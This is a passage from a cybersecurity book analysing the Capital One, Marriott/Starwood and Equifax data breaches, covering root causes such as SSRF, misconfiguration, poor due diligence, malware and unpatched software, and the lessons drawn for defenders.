privileged program that  provides services to other programs, but its privileges can be abused. In the  case of the Capital One breach, the metadata service is confused because  it doesn’t know which program is the end consumer of the information  that it is providing, and it gets tricked into inadvertently providing security  credentials to the attacker due to the SSRF vulnerability in the software on  the EC2 instance.   Stolen Credentials In Step 3 of the attack shown in Figure 2-7, the attacker stores the  stolen security credentials in the AWS command-line shell  a tool that  programmers use to send commands and receive responses to and from  machines . The stolen security credentials allow her to impersonate a  legitimate client that has those credentials.

Step 5 of Erratic’s attack   Chapter 2    the Capital One BreaCh   It seems that after the attack was complete, she also copied and archived   the stolen data at GitHub, a popular site used by developers to store and  manage source code. As mentioned earlier in this chapter, Erratic’s resume  was found in the same repository that the stolen data was in.   Incident Timeline and Aftermath Erratic’s data download and completion of the breach occurred around  March 22 and 23, 2019. Capital One became aware of the breach  approximately four months later on July 17, 2019, when their responsible  disclosure team received an email, as per Figure 2-10, from a security  researcher pointing them to the GitHub repository at which the stolen data  was archived.  Figure 2-10.  Responsible disclosure email sent to Capital One  The breach became known to the world on July 29, 2019, with the  publication of an FBI criminal complaint against Erratic. Such speedy  attribution and pressing of criminal charges is rare and was probably only  possible due to the fact that Erratic left so much evidence incriminating  herself as she was most probably an amateur  possibly even mentally  unstable . Erratic was taken into custody by the FBI, and additional   51   Chapter 2    the Capital One BreaCh   investigation of her computer accounts and forensics on them found that  she was identifying vulnerabilities and possibly accessing data at other  corporations as well.  In the aftermath of the breach, it was good to see that Capital One   offered identity protection in addition to credit monitoring for those  individuals whose personally identifiable information was made public in  the exposed credit applications. Note that there is a significant difference  between just credit monitoring and full-fledged identity protection. Credit  monitoring typically provides victims visibility into events that might affect  their credit, whereas identity protection is often broader, providing not  only monitoring but also recovery services and insurance coverage as a  part of protections offered for assets in addition to credit lines.  We discuss the differences between credit monitoring and identity   protection in much more detail in Chapter 15. Although any mega-breach  can be disheartening for all the victims involved, we believe it was positive  to see Capital One offer identity protection and not just credit monitoring  as a part of their response to the breach.   Summary In summary, the Capital One breach of 2019 was the largest cloud security  breach of its time, and root causes of the breach were twofold:     Human misconfiguration error: A misconfigured   identity and access management policy in which access  to the S3 bucket with the sensitive data may have been  too broad.     Software vulnerability: A server-side request forgery   vulnerability in which the attacker was able to have  their requests relayed to the Amazon metadata service  and receive responses, including security credentials.  52   Chapter 2    the Capital One BreaCh   Finally, the sheer volume and complexity of configuration parameters   “knobs”  for cloud services is staggering. Complexity is often the enemy  of security, and one key lesson for the industry from the breach is that the  configuration complexity can lead to insecurity. Cloud service providers  may want to consider making their services simpler to use, at the potential  expense of flexibility. One approach could be to have cloud providers or  third-party cloud firewalls choose secure defaults and “hide” many of  the advanced settings. In the meantime, enterprises that leverage cloud  services will have to be more diligent around configuration reviews, using  a combination of automated and manual reviews.  53   CHAPTER 3  The Marriott Breach  The Marriott breach of 2018 was one in which 383 million records and  over 5 million passport numbers were stolen. The stolen records included  names, dates of birth, credit card information, and home addresses. The  breach was suspected to be due to a Chinese nation-state–funded attack in  support of espionage efforts. It occurred due to three key causes:    1.  Marriott’s acquisition of Starwood Hotels without  uncovering a breach at Starwood as a part of due  diligence around the acquisition    2.  Poor security culture, staffing, and “technical debt”     3.  Starwood and Marriott’s susceptibility to malware   at Starwood Hotels  attacks  At the time of its breach in 2018, Marriott was the largest hotel   company in the world, operating in more than 130 countries. Through  its owned and franchised properties, Marriott provided just short of  1.3 million hotel rooms. Customer data, including reservations, where  customers have stayed, the amount of money they spent on what items  while they stayed at the hotel, and so on were critical to its business. To  keep its massive numbers of hotel rooms filled, Marriott leveraged data-  driven marketing campaigns and loyalty programs and felt it needed to do  more to grow its business.  Also, at the time of the Marriott breach, the magnitude of the   breach was only second to Yahoo’s hack of three billion email accounts.     Neil Daswani and Moudy Elbayadi 2021  N. Daswani and M. Elbayadi, Big Breaches, https:  doi.org 10.1007 978-1-4842-6655-7_3  55   Chapter 3    the Marriott BreaCh  In addition to millions of passport numbers, the location history of  hundreds of millions of people was among the data stolen in the breach  and has significant implications. Combined with stolen data from the  US Government’s Office of Personnel Management  OPM  breach  also  attributed to China and described in Chapter 6 , one could potentially  derive the location histories of CIA agents and spies that happened to stay  at any of Marriott’s approximately 1.3 million worldwide hotel rooms while  on assignment.  Think of the depth of knowledge they could now have about  travel habits or who happened to be in a certain city at the  same time as another person … It fits with how the Chinese  intelligence services think about things. It’s all very long range.  —Robert Anderson, Former Senior   FBI Executive Assistant Director1  Although one would clearly expect that CIA agents and spies use aliases   with passports and passport numbers to support their aliases, it would be  hard to believe that information for some such agents could not be derived  given the amount of data stolen. The Marriott breach together with the OPM  breach likely put more intelligence personnel and efforts at risk, in addition  to identity theft risks to consumers that typically come with breaches.   The Acquisition Marriott had done many “tuck-in” acquisitions of smaller hotel companies  prior to its acquisition of Starwood Hotels: Gaylord Entertainment  Company  7,800 rooms for $210 million , Protea Hospitality Holdings   1 Christopher Bing, Reuters: Clues in Marriott hack implicate China. www.reuters. com article us-marriott-intnl-cyber-china-exclusive exclusive-clues- in-marriott-hack-implicate-china-sources-idUSKBN1O504D  56   Chapter 3    the Marriott BreaCh   10,000 rooms for $186 million , and Delta Hotels Limited Partnership   10,000 rooms for $135 million . The acquisition of Starwood, by  comparison, though, was intended to be a massive transformative  acquisition of upwards of 350,000 rooms for $13 billion. The acquisition  of Starwood would make Marriott the top hotel company in the world.  Starwood’s reservation database and loyalty programs database were also  valuable information assets in the context of the acquisition. Marriott was,  expected by its shareholders to do significant and extensive due diligence  leading up to the acquisition.  As we will see, the breach at Starwood had actually taken place a year   before the acquisition was signed and was not uncovered as part of the due  diligence process. Marriott would eventually be fined over $120 million   USD  for violations of the European GDPR  General Data Protection  Regulation  act and was faulted for the insufficient due diligence  conducted:  The  European  Union’s  Information  Commissioner’s  Office   “ICO” , an agency in the UK which regulates European data  laws, damningly found after its investigation that “Marriott  failed  to  undertake  sufficient  due  diligence  when  it  bought  Starwood  and  should  also  have  done  more  to  secure  its  systems.”  —Corrected Amended Consolidated Class Action  Complaint, for Violations of Federal Securities   Laws, Filed in US District Court of Maryland,   August 21, 2019  In a statement made to the US Senate after the breach, Marriott’s   CEO, Arne Sorenson, said Marriott could only do limited due diligence as  Starwood was a competitor.  57   Chapter 3    the Marriott BreaCh  The  transaction  closed  on  September  23,  2016.  During  the  intervening  ten  months,  we  obtained  information  about  Starwood’s technology and network and assessed how to inte- grate the two systems, although our inquiry was legally and  practically limited [emphasis added] by the fact that, until  the merger closed, Starwood remained a direct competitor of  Marriott.  —Arne Sorenson, President and CEO, Marriott  International, US Senate Testimony, March 7, 20192  However, in an earlier statement prior to discovery of the breach,   Marriott’s CEO stated it was doing extensive due diligence.  Since we announced the merger in November 2015, our inte- gration  teams  have  met  on  average  multiple  times  a  week  across disciplines. As a result of our extensive due diligence  [emphasis added] and joint integration planning, we are now  even  more  confident  in  the  potential  of  cost  savings  of  this  transaction.  —Arne Sorenson, President and CEO, Marriott  International, LinkedIn post, March 21, 2016  Although there were many meetings and reviews as a part of due   diligence, the focus may have been on cost savings, as there was no  mention of a penetration test or a “hunting” exercise to determine if  Starwood was already breached in class action complaints or US Senate  testimony. Penetration tests are consulting engagements where ethical  hackers attempt, with appropriate authorization, to break into an  organization. Based on what they find, security holes can be fixed, and the  security posture of an organization can be “hardened” or made tighter.  2 www.hsgac.senate.gov imo media doc Soresnson%20Testimony.pdf  58   Chapter 3    the Marriott BreaCh  A penetration test determines whether or not there open   vulnerabilities that could be exploited by attackers, whereas a hunting  exercise determines whether or not such vulnerabilities might have been  already exploited to carry out a breach. Penetration tests of potential  acquirees are often conducted when there is sufficient risk, although  hunting exercises are much less common. However, given the number  of malware compromises that had previously occurred at Starwood, a  hunting exercise might have been reasonable to conduct.  As a former CISO of a public company, I  Neil  often required    full-scale penetration tests and sometimes required hunting exercises  for organizations we were seeking to acquire prior to the close of the  acquisition. I have also been on the other side of the fence and have had  my company subjected to holistic penetration tests when parties were  interested in acquiring the company at which I served as a CISO. In  reviewing a comprehensive, over 200-page derivative lawsuit against  Marriott and an over 150-page class action lawsuit, I saw no mention of a  holistic penetration test as a part of the due diligence process. Even if the  results of such tests may have been sealed for confidentiality, the existence  of such tests should be expected. Also note that while some penetration  tests are required to satisfy PCI compliance, such tests are typically  “scoped” for testing protections around cardholder or PAN  primary  account number  data, instead of a holistic penetration test that targets the  entire organization.  Penetration testers will often find some way to break into a network. It  is important for companies to analyze how penetration testers are able to  break into the network. The more time and effort it takes for penetration  testers to succeed, the better protected a company is from nation-state  attackers or organized cybercriminals.  Consider the value of the target and be at a state where the amount of  time and effort required to break in would not justify the target. Such is a  rational approach to consider defending against organized cybercriminals.  However, nation-state actors may have almost limitless resources by   59   Chapter 3    the Marriott BreaCh  comparison and should also be considered irrational with respect to the  amount of effort and expense they may be ready to deploy to compromise  a target. If a sizable foreign nation-state is the adversary, and they set their  sights on a target, it may only be a matter of time before they break in.  There are indications that Marriott was “house poor” after the   acquisition, as per confidential witness accounts from former insiders at  Marriott. Marriott supposedly spent so much on the acquisition that they  didn’t have enough money to properly integrate, let alone secure, the  information assets post the acquisition.  From a business perspective, some fraction of the amount of money a  company plans to spend on an acquisition should be allocated to aspects  both prior to and after the acquisition. Due diligence, including security  reviews, penetration tests, and hunting exercises in and of themselves, can  involve some cost, and then the execution of integration of the acquired  company afterward can certainly be costly as well.  Before you buy a car, for instance, you should probably take the car  to a mechanic to assess what might need fixing, and prior to making the  purchase, make sure you have enough money to fix the car up if and as  needed in addition to the cost of paying for the car itself. The assessment  from the mechanic can potentially even help you negotiate a lower price  for the purchase itself if the car needs some significant fixing. If you don’t  allocate enough money to spend on the mechanic or for fixes needed  afterward, you might successfully acquire the car, but it may break down  soon after you buy it. In Chapters 10 and 11 we discuss the importance  of having the right engagement between the business and security and  technology executives to make acquisitions work better for the enterprise.   Malware Starwood’s systems had already experienced multiple breaches involving  malware prior to completion of the acquisition, and a multitude of  malware was used in attacks against Starwood and Marriott in the years   60   Chapter 3    the Marriott BreaCh  prior to Marriott’s mega-breach. In November 2015, just five days after  the announcement of the signing of the acquisition, Starwood disclosed a  breach in which point-of-sale  POS  systems in some of its North American  hotels were infected with malware during the period from November  2014 to October 2015. The malware exposed cardholder’s names, credit  card numbers, expiration dates, and CVV2 codes—all the necessary  information that an attacker would need to charge stolen credit cards. In  August 2016, a breach involving malware affecting 20 hotels, including  Starwood and Marriott, was disclosed.  In June 2017, an external malware analyst was able to download  a malware sample and access the webmail system used by Marriott’s  Computer Incident Response Team  CIRT . Forbes had published an  article regarding the June 2017 malware incident. A source told Forbes that  the compromise was due to a mistake by one of Marriott’s consultants. A  Marriott spokesperson confirmed “The breach that resulted was an isolated  incident involving that one analyst’s machine that had access to Marriott’s  outlook Web access mailbox but was not connected to the Marriott network.”  So while the incident could have been, in part, attributed to human error   in this case, the human error of a security consultant  and may have been  localized to webmail, further incidents would unfold that showed that  Marriott’s network was previously exposed and not just its webmail.  In July 2017, just a month later, another malware compromise in   which malware running on six servers hosting Starwood website domains  were found to be part of a Russian botnet  a network of compromised  machines .   Poor Security at Starwood Confidential witness accounts from former employees and consultants in  a class action lawsuit against Marriott after the breach stated that Marriott  intended to scrap most of Starwood’s systems. Starwood’s systems were   61   Chapter 3    the Marriott BreaCh  generally insecure, old, and very costly to fix. For instance, Starwood’s Oracle  database systems were seven or more years past “end-of-life,” could not be  patched, and may have potentially cost hundreds of millions of dollars to fix.  Such expensive fixes and updates in which software systems have not been  maintained are often termed as “technical debt.” The business can continue  to operate, but maintenance would be very expensive. Such “debt” should  ideally be regularly “paid off” by making progress on system maintenance  and upkeep, instead of or in parallel with the development of new system  features. Given the immense amount of technical debt, Marriott had  intended to compartmentalize Starwood’s systems and keep them separate  and isolated until they could be altogether replaced.  The cybersecurity group at Starwood Hotels was described as a “joke”   by one former cybersecurity consultant for Starwood, claiming that they  had only a five-member information security team to support the activities  for over 100,000 employees, more than 40 million customer users, more  than 150 applications, and thousands of POS systems worldwide. Even  though Starwood’s security team was already grossly understaffed,  Marriott laid off most of Starwood’s corporate staff after the acquisition,  including those in IT and information security. Even if Marriott intended  to replace such staff with their own, such an approach may have grossly  underestimated the potential advantage of retaining the technical  knowledge that small group of personnel had to help guide them through  replacing Starwood’s systems and mitigating information security risks in  the interim. One confidential witness at Marriott believed that Marriott’s  own IT security team was also somewhat understaffed, especially after  attrition that occurred post the departure of their Senior Vice President of  Information Protection and IT security.  In most mergers and acquisitions  M&A , corporate M&A teams work  to identify “synergies” that cut costs to exploit economies of scale. Given  the general understaffing in the field of information security, a better  “synergy” to exploit might be to retain security personnel and combine  teams, as it is likely that both information security teams in the acquiring   62   Chapter 3    the Marriott BreaCh  and acquired entity are understaffed prior to the acquisition. If enough  synergies in other areas are identified, reducing the combined number  of employees, applications, and systems, the combined information  security team could potentially have more of a fighting chance at  avoiding a breach.  Starwood had a SIEM  security incident and event management    system to monitor security logs for threats, but it had not been scaled up  to monitor data from all of Starwood’s 800 servers. Many organizations  aggregate logs that might have security events or warnings into a  centralized SIEM system that correlates and monitors for signs of attack,  compromise, or breach. When the SIEM system identifies such sufficient  signs, the system generates an alert that can be reviewed and or further  investigated by a human security analyst. In Starwood’s case, there  were not enough employees to monitor security alerts that were being  generated by the system.  A confidential cybersecurity witness also claimed that Starwood did   not employ PAM  privileged access management  tools to specifically  secure more sensitive administrator credentials, and stolen administrator  credentials were used in the breach, as we shall see later in this chapter.  Even worse, Starwood’s systems to store employee and customer  credentials were storing passwords “in the clear unencrypted”  not even  “salted” or “hashed” for those readers familiar with password security  systems; please see Chapter 9 in my  Neil’s  previous book3 for more  explanation . For reference, it is standard for companies to “hash” and  “salt” passwords in the case that the password file gets compromised.  3 Daswani, Neil, Christoph Kern, and Anita Kesavan. Foundations of Security: What  Every Programmer Needs to Know. Apress, 2007.  63   Chapter 3    the Marriott BreaCh  Marriott had “tokenized” credit card numbers in its systems.   Tokenization is a security best practice in which actual sensitive data, such  as credit card numbers, are replaced with random, meaningless token  numbers instead of storing actual credit card numbers. That way, if the  random, meaningless tokens are stolen, there is no breach or security  exposure. Also, the tokens that are used in place of actual credit card  numbers can safely be transmitted from system to system. The mapping  correspondence of the meaningless token numbers to the real credit  card numbers can be stored in a separate, isolated system that is more  stringently secured. Starwood, by comparison, did not use tokenization in  its systems.  A class action lawsuit filed against Marriott and its executives revealed   that Starwood relied on a plethora of consultants from companies such  as Accenture and Dell SecureWorks. With the departure of Marriott’s  Senior VP in charge of Information Protection and IT security, there was  significant attrition of the security team, and security functions had been  outsourced to consultants.  Incidentally, a similar pattern has occurred with other breaches— for instance, in the Experian breach of 2015, there had been significant  attrition of the information security team prior to its breach and after  merger and acquisition activity. A combination of merger and acquisition  activity at an organization combined together with security team attrition  increases the probability that a breach may subsequently occur.   Mega-Breach Detection In September 2018, almost three years after the acquisition was signed  and almost two years after the transaction had closed, the detection of the  mega-breach of hundreds of millions of records and millions of passport  numbers would begin. The detection began when IBM Guardium, a  security tool that detects anomalous queries to databases, among other  security functions, identified that a query for the number of rows in a   64   Chapter 3    the Marriott BreaCh  critical database table was issued. Most queries to databases are issued by  programs, and programs typically issue and reissue the same set of well-  known queries. The query for the number of rows was not an expected  query issued by a program. It was issued from a human administrator’s  account, instead of a “service” account. Service accounts are typically used  by running programs instead of humans.  Note that the query did not request any of the contents of the database   table—just the number of rows in the table. When attackers are getting  ready to steal and exfiltrate a large data set, they may issue a query asking  for the number of rows in the database to help them estimate the size of  the data set so that they can then plan their exfiltration, as it may need to  be done in multiple parts to avoid detection.  One day after the IBM Guardium alert occurred, an internal   investigation team consulted with the database administrator whose  account was used to issue the query. When the database administrator did  not claim ownership of the query, it was clear that a system compromise  had likely occurred.  Unexpected queries are one type of alarm that an attacker can trip.  Transfer of large amounts of data can be another alarm that intrusion  detection systems or firewalls can identify. In the case of the Marriott  breach, the attackers may have been attempting to work around triggering  alarms based on large amounts of data movement that they were  attempting to steal but ended up triggering an alarm that was looking for  unexpected queries against the database.   Even More Malware Two days after the initial IBM Guardium alert occurred, an external  investigation team was brought in, as is typical  for their expertise,  objectivity, and many other reasons  when a potential breach might be  in play. The external investigation team would within one week identify  yet more malware running within Marriott’s network—in particular, a   65   Chapter 3    the Marriott BreaCh  Remote Access Trojan  “RAT” . A RAT is a form of malware that gives an  attacker a persistent “backdoor.” Using the backdoor, the attacker can  not only covertly access and monitor a system but also issue arbitrary  commands of their choice from within the compromised network. The  RAT could have been used to issue the query using a stolen administrator  account. But how did the attackers get control of an administrator  account?  With just a couple more weeks of investigation, even more malware   was discovered which explained how the administrator’s account was  commandeered. This time, Mimikatz malware was discovered. Mimikatz  is a tool that has been used by both penetration testers and malicious  attackers to scan a machine’s memory for usernames and passwords.  The tool was originally created for good to demonstrate a vulnerability   in the handling of passwords by Microsoft Windows. Mimikatz was  developed by a 25-year-old French programmer by the name of Benjamin  Delpy. He developed the tool as a concept prototype to exhibit to  Microsoft how dangerous the vulnerability was. Microsoft, although  the company has generally prioritized security highly and is to be  commended in many of its efforts, was not so concerned in this particular  case because they felt that one already needed to have compromised a  system to use such a tool. However, they may not have accounted for how  much it amplifies an attacker’s ability to acquire additional privileges  and credentials once an initial compromise is made. On a trip to Russia,  in which Delpy was to present his work on Mimikatz in Moscow, his  laptop and the source code for Mimikatz were stolen  presumably by the  Russians .4 Since then, hackers of all kinds have used Mimikatz in their  attacks.  Perhaps Microsoft should have listened in this particular case and  Delpy may not have felt motivated to develop a concept prototype that  weaponized the vulnerability. At the same time, so long as the vulnerability   4 www.wired.com story how-mimikatz-became-go-to-hacker-tool   66   Chapter 3    the Marriott BreaCh  existed unpatched, some other security researcher may have written a  prototype exploit, or worse an attacker may have written a tool to exploit it  in zero- day fashion, completely unbeknown to Microsoft and the world.  Nevertheless, penetration testers have used Delpy’s tool for noble   purposes, such as demonstrating how hackers can use Mimikatz to steal  passwords, escalate privileges, and move laterally through a system. Hackers have also used Mimikatz in all the ways described. For   instance, the suspected Chinese attackers in Marriott’s mega-breach  used Mimikatz to siphon usernames and passwords that were being  held in memory. Hackers most likely used Mimikatz to gain access to  administrator credentials.  Alas, the third-party investigators determined that the attackers had   already stolen quite a bit of data prior to the query that resulted in the  Guardium alert. The attackers likely used one or more stolen account  credentials, possibly obtained via the use of Mimikatz to steal data en  masse, issuing queries that did not just check for the numbers of rows in  tables but rather for the entire contents of mega-sized tables with sensitive  data. The Guardium alert was probably generated because attackers may  have been in the process of planning to steal even more data.  By the next month, the third-party investigators had identified two  large files, one with data from the Starwood guest reservation database  and the other holding passport information that attackers had exfiltrated  and stolen. Once the stolen files had been identified, Marriott began the  process of notifying over 300 million customers of the breach.  It turned out that the breach announced in 2018 was undetected for   four years, not only by Starwood’s security team a year prior to the signing  of the acquisition, but it was also undetected during the due diligence that  Marriott had conducted on Starwood’s systems. It was also undetected by  Marriott’s security team post due diligence.  67   Chapter 3    the Marriott BreaCh   The Aftermath and Lessons Learned There were many implications and lessons to be learned from the Marriott  breach, beyond the importance of addressing the root causes that we make  a case for in this book. In this section, we briefly cover some additional  implications and lessons.     More proactivity needed. Reactivity is status quo: Once   the breach was identified, Marriott began to roll out  endpoint protection tools to hundreds of thousands of their  devices to determine the full extent of the breach. Arguably,  had such tools been deployed earlier in Starwood’s  network, they could have potentially detected initial  compromise and prevented the breach. Instead, endpoint  protection tools were rolled out to over 200,000 devices  in Marriott’s network after the breach was identified to  determine if there was additional compromise and or  breach. On one hand, proactivity is needed to invest in and  deploy necessary countermeasures ahead of time, instead  of reactively. On the other hand, Starwood’s security and  IT teams were understaffed and may not have had the  budgetary, political, or other organizational support to roll  such protection tools out earlier. In the next chapter on the  Equifax breach, we will similarly see that such a rollout of  endpoint protection tools was done after a mega-breach.     Compliance vs. security: Marriott was subject to PCI DSS,  GDPR, the FTC Act, as well as other compliance standards  and regulation. Achieving compliance—regulatory or  otherwise—does not, in and of itself, achieve security. One  confidential witness said that the driving force behind data  security at Marriott was PCI compliance. One should keep  in mind that in many cases compliance can be viewed as   68   Chapter 3    the Marriott BreaCh  the “minimum bar.” Achieving security is a much higher  bar. If compliance is the driving force, and that goal is even  slightly missed, the goal of security is usually missed by  far. Rather, organizations should set out to be secure and  achieve compliance as much as possible as a side effect of  their security efforts.     Private compliance standards not enough more   regulation possibly needed: Private compliance  standards, such as PCI, can be “business enablers” in  the sense that if an organization does not achieve PCI  compliance, it cannot, say, take credit card numbers and do  business in a modern world. At the same time, in addition  to compliance being a minimum bar, private compliance  auditors for standards such as PCI  sometimes also called  qualified security assessors, or QSAs, in the context of  a PCI audit  are still paid by the organization seeking  compliance certification at the end of the day, and losing  compliance certification might not happen in practice as  often as it perhaps should. As such, one might argue that  stricter penalties are required to cause financial pain for  an organization should there be a breach. Although an  organization can be fined by the PCI Standards Council   run by the large credit card brands such as Visa and  Mastercard  in the event of a breach, stricter penalties  imposed by government regulators may be warranted in  some cases. Avoidance of such penalties, depending on  the size of the penalty of course, can potentially incentivize  good security as anything short of it can result in a breach.  Some would argue that penalties had not been strict  enough:  69   Chapter 3    the Marriott BreaCh  Clearly, current status quo isn’t working … The Federal Trade  Commission needs real powers with strong teeth in order to  punish  companies  that  lose  or  misuse  Americans’  private  information. Until companies like Marriott feel the threat of  multibillion-dollar fines, and jail time for their senior execu- tives, these companies won’t take privacy seriously.  —Senator Ron Wyden  D-OR 5  Incidentally, a year after the Marriott breach, in 2019,  Facebook was issued a $5 billion penalty for a breach  that we will cover in Chapter 5. Facebook’s annual  revenue was north of $70 billion in 2019, and the  penalty amounted to about 7% of that revenue. Even for  companies that take privacy seriously and prioritize,  invest, and execute on security initiatives, security and  privacy can still be a challenging technical goal; hence,  a focus on addressing root causes is paramount.     Executive accountability: The CIO was explicitly named   in the class action lawsuit against Marriott, in addition  to CEO and CFO. As was the case starting with the Target  breach of 2013 after which the CEO and CISO were fired,  executives at public companies are starting to be held  accountable for security if there is a breach.  Many of the confidential witnesses in the class action  lawsuit against Marriott slammed its executives for their  bad decisions, misprioritizations, and for not allocating  funds and staff where they felt they were needed. If  you’re an executive, it is important to listen to the   5 www.nbcnews.com tech security marriott-says-data-breach-compromised-  info-500-million-guests-n942041  70   Chapter 3    the Marriott BreaCh  employees who are fighting the day-to-day challenges  and battles. If you don’t and there is a breach, you can  be sure that attorneys and judges are going to want  to listen to them. Attorneys, a judge, and a jury will  be listening to former employees who have strong  opinions about past decisions, misprioritizations, and  calls on fund allocations.     Data minimization: If you don’t need it, don’t keep   it. Senator Tom Carper questioned Marriott’s data  retention policies and stated that he did not “know  why [Marriott] would need to have maintained records  of millions of guest passport numbers as appears  to have occurred in this case.” He also said that the  breach “raises questions about the degree to which  cybersecurity concerns do and should play a role in  merger and acquisition decisions.”6     Web monitoring vs. identity protection: In the  aftermath of the breach, Marriott offered “web  monitoring” instead of traditional credit monitoring or  identity protection through two services: WebWatcher  for US consumers and Experian IdentityWorks Global  Internet Surveillance for consumers in other countries.  WebWatcher monitors “dark web” sites where personal  information may be shared by cybercriminals and alerts  consumers if evidence of their personal data is found.  WebWatcher also provides fraud loss reimbursement  coverage and fraud consultation services for one year.  6 Opening Statement of Ranking Member Carper: “Examining Private Sector  Data Breaches”. https:  www.carper.senate.gov public index.cfm 2019 3  opening-statement-of-ranking-member-carper-examining-private-sector- data-breaches.  71   Chapter 3    the Marriott BreaCh  Marriott has been criticized for providing such  monitoring instead of traditional credit or identity  protection monitoring for a variety of reasons.7 The  biggest reason is that such monitoring only alerts  consumers if data is identified on the dark web. The  stolen data could be used by a foreign nation-state but  may never be posted to the dark web as dark websites  are typically used by cybercriminals to buy and sell  such data. Nation-state attackers may have no such  need to sell the data on a dark web exchange site, yet  consumers can still be at risk. In addition, coverage was  only provided by Marriott for a one-year period, even  though some stolen data could still be at risk for years  to come, in addition to other such criticisms.  Dark web monitoring services are often offered for  free by companies that provide much more holistic  identity protection  see discussion in Chapter 15 for  more information . However, there may be some  cost to potentially provide such services to a large  number of consumers. Nevertheless, providing dark  web monitoring to a large number of consumers is  likely to be much less expensive than providing credit  monitoring or identity protection. Given that Marriott  might have been “house poor” post the acquisition of  Starwood, dark web monitoring may have been the  only viable tool that Marriott might have been able to  afford for a large number of consumers affected by the  breach.  7 www.consumerreports.org identity-theft why-marriotts-id-theft-  protection-may-not-be-enough   72   Chapter 3    the Marriott BreaCh  It turns out that only approximately 0.07% of the 383  million victims had adopted the services three months  after the breach was announced. WebWatcher was  activated by 250,750 US guests within the first three  months of the announcement of the breach, and  Experian IdentityWorks Global Internet Surveillance  was adopted by approximately 36,000 guests in  the same time period. Although adoption rates of  remediation services provided by the organizations  that get breached are generally low as consumers lose  trust in them and may opt to acquire remediation  services from elsewhere, an adoption of 0.07% is an  especially low percentage. That low percentage of  adoption probably saved Marriott quite a bit of money  compared to what other breached organizations paid  for remediation services for their consumers.     Cost of breach: Overall, Marriott incurred a charge of  over $120 million for the breach8 at the time of writing  of this book and was able to recover a significant  amount of that from its cyber insurance policy. By  comparison, as we will see in Chapter 8, the cost of  Target’s breach in 2013 in which “only” approximately  40 million records were stolen was about $300 million.9  That said, at the time of writing of this book, there are  still class action and derivative lawsuits pending that  may further drive up the cost of Marriott’s breach.  In addition, Marriott suffered another data breach   8 www.wsj.com articles marriott-take-126-million-charge-related-to- data-breach-11565040121 9 www.thesslstore.com blog 2013-target-data-breach-settled   73   Chapter 3    the Marriott BreaCh  affecting 5.2 million guests in January 2020 due to  hackers obtaining login credentials of two employees,  resulting in additional cost.   Summary In summary, the Marriott breach of 2018 occurred due to three root causes.  The following are the root causes and the highest-order lessons to carry  away:     Third-party risk not sufficiently vetted acquisition: If  you acquire a breached organization, your organization  is breached as well.     Security culture, staffing, and technical debt: When   it comes to security, set the right tone, fund your  security program with people and resources, and  then listen to your employees and consultants. Act on  their recommendations. Maintain your systems. Patch  vulnerabilities. Doing so helps prevent malware and  hackers from exploiting your systems. If you have a  breach, all the dirty laundry will eventually be aired.  If the breach is bad enough, all the dirty laundry may  come out in front of Congress or the Senate in addition  to being all over the press.     Malware: As malware is one of the most common   tools used by attackers, it is important to have  strong defenses to prevent, detect, contain, and  recover from malware attacks. We will cover relevant  countermeasures for both current and next-generation  malware threats in Chapter 12.  74   CHAPTER 4  The Equifax Breach  In September 2017, the largest financial identity breach of US consumers  at its time was announced by Equifax. At the time of the breach, Equifax  was one of the top three credit reporting agencies in the United States  and a custodian of credit information for 820 million consumers and 91  million businesses. Over 145 million records were stolen by four suspected  and later indicted Chinese hackers who were part of the Chinese People’s  Liberation Army, a part of the Chinese armed forces. Table 4-1 shows  the number of names, addresses, social security numbers, and dates of  birth, among other sensitive data that were stolen. The breach was due to  Equifax’s Automated Consumer Interview System  ACIS , which allowed  consumers to dispute potentially incorrect information in their credit  files. One root cause was a software vulnerability that was not patched, the  details of which we will describe in this chapter.  Table 4-1.

However, the acquisitions did not play a  direct role in the breach. Equifax did have a few antiquated legacy systems,  some which were acquired and some which were developed internally,  especially after 2005 when Equifax embarked on a significant growth  strategy through acquisition.  Rather, system maintenance, including patching and renewal of   security certificates, which we will also cover in more depth in this chapter,  were not done in a timely fashion. In addition to a critical software  vulnerability, and a lack of maintenance of software and security systems,  the Equifax breach was also made possible due to a lack of network  segmentation between its many systems and databases, as well as a lack  of file integrity monitoring systems that could potentially have detected  unauthorized backdoors that were installed by the attackers.  76   ChAPTEr 4    ThE EquIFAx BrEACh  Also, similar to Marriott, Equifax had experienced multiple smaller   breaches prior to its mega-breach. In fact, Equifax was a supplier to  LifeLock, and in my  Neil’s  role as CISO at LifeLock at the time, I had  serious concerns about a small and not widely publicized  but publicly  reported  breach at Equifax of 158 records that had impacted LifeLock  customers. Equifax also had a breach involving a few hundred thousand  Kroger employee records due to a security issue in the W-2 Express site  that Equifax provided to Kroger, its customer. To an extent, such breaches  can be an indication of gaps in an organization’s security posture. Small  breaches can be precursor to a larger or a mega-sized breach should the  organization not react fast enough by making aggressive improvements to  an its security posture.  Incidentally, Equifax has not been the only major credit reporting  agency to have suffered a data breach. The top three credit reporting  agencies have historically been Equifax, Experian, and TransUnion, and  each of them has had security issues. Experian disclosed a significant  data breach in 2015 in which social security numbers and other data of 15  million consumers who applied for financing through wireless provider  T-Mobile were stolen. Experian’s breach was indirectly due to lax security  around some of its acquisitions and attrition of its security team.  At the time of writing of this book, of the top three credit reporting   agencies, TransUnion seems to have had the least number of consumer  records exposed due to security issues, but it has also had some security-  related events. In October 2017, for instance, TransUnion’s Central  America website had a compromise which redirected users to a drive-  by- download, and, in another instance in 2019, an access code to one of  TransUnion’s systems belonging to one of its customers, CWB National  Leasing, was abused to expose credit file data of up to 37,000 Canadian  consumers.  In addition, the knowledge-based authentication  KBA  questions  that all three agencies used to authenticate consumers have had their  limitations. In March 2013, the credit reports for Michelle Obama,   77   ChAPTEr 4    ThE EquIFAx BrEACh  Paris Hilton, Hillary Clinton, and Robert Mueller were accessed by an  unauthorized party because the party was able to use publicly available  information to answer the three credit bureaus’ KBA questions for such  public figures. Improving the process of authenticating consumers  before giving them access to their own credit reports  e.g., via multi-  factor authentication in addition to KBAs and via other means that we  will discuss in Chapter 12  is an important area, as simple knowledge of  “metadata” about a person should ideally not give an attacker the ability to  impersonate someone.  In this chapter, as we have done for breaches covered in previous   chapters, we will cover how the Equifax breach occurred, provide details  around its root causes, and discuss key lessons that can be learned from  the breach and the broader implications of the breach.   The Attack Explained In this section, we explain how Chinese attackers achieved an initial  compromise at Equifax.   Apache Struts and CVE-2017-5638 Apache Struts1 is a widely used application middleware package that  allows software developers to more easily write applications using the Java  programming language. Apache is short for Apache Software Foundation  and is named after a wildly successful open source web server. Struts, as a  middleware software package, is composed of several components, one of  which is a running web server.  1 https:  struts.apache.org   78   ChAPTEr 4    ThE EquIFAx BrEACh  Struts was in 